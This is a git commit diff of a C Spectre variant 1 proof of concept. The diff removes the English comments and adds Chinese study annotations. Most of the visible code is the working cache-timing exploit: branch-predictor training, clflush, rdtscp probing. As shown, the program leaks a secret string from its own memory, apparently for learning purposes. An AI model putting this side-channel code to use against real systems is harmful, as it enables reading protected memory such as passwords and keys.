4358cb908f68ece3a6c9f43bf78bdf198ae57503
Mao wenxin <112704604+kijisme@users.noreply.github.com>
2024-05-22 06:16:22 +0000

    2024-4-17 添加修改

--- Source.c
+++ Source.c
@@ -22,9 +22,9 @@ uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char* secret = "The Magic Words are Squeamish Ossifrage.";
+char* secret = "Magic Words";
 
-uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
+uint8_t temp = 0; 
 
 void victim_function(size_t x)
 {
@@ -37,9 +37,8 @@ void victim_function(size_t x)
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (80)
 
-/* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 {
 	static int results[256];
@@ -53,42 +52,37 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		results[i] = 0;
 	for (tries = 999; tries > 0; tries--)
 	{
-		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+			_mm_clflush(&array2[i * 512]);
 
-		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
+		//训练分支预测 每训练5轮攻击1次
 		for (j = 29; j >= 0; j--)
 		{
 			_mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++)
 			{
-			} /* Delay (can also mfence) */
-
-			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
+			} 
+			x = ((j % 6) - 1) & ~0xFFFF; 
+			x = (x | (x >> 16));
 			x = training_x ^ (x & (malicious_x ^ training_x));
 
-			/* Call the victim! */
 			victim_function(x);
 		}
 
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		//测试命中
 		for (i = 0; i < 256; i++)
 		{
 			mix_i = ((i * 167) + 13) & 255;
 			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			time1 = __rdtscp(&junk);
+			junk = *addr;
+			time2 = __rdtscp(&junk) - time1;
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++; /* cache hit - add +1 to score for this value */
+				results[mix_i]++; 
 		}
 
-		/* Locate highest & second-highest results results tallies in j/k */
+		//找到命中次数最多的两个
 		j = k = -1;
 		for (i = 0; i < 256; i++)
 		{
@@ -102,10 +96,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 				k = i;
 			}
 		}
+		
 		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+			break; 
 	}
-	results[0] ^= junk; /* use junk so code above won't get optimized out*/
+	results[0] ^= junk; 
 	value[0] = (uint8_t)j;
 	score[0] = results[j];
 	value[1] = (uint8_t)k;
@@ -132,6 +127,7 @@ int main(int argc, const char* * argv)
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0)
 	{
+		// (value[0] > 31 && value[0] < 127 ? value[0] : '?')判断是否是可打印的assci码
 		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
@@ -143,6 +139,7 @@ int main(int argc, const char* * argv)
 				   score[1]);
 		printf("\n");
 	}
+	
 #ifdef _MSC_VER
 	printf("Press ENTER to exit\n");
 	getchar();	/* Pause Windows console */
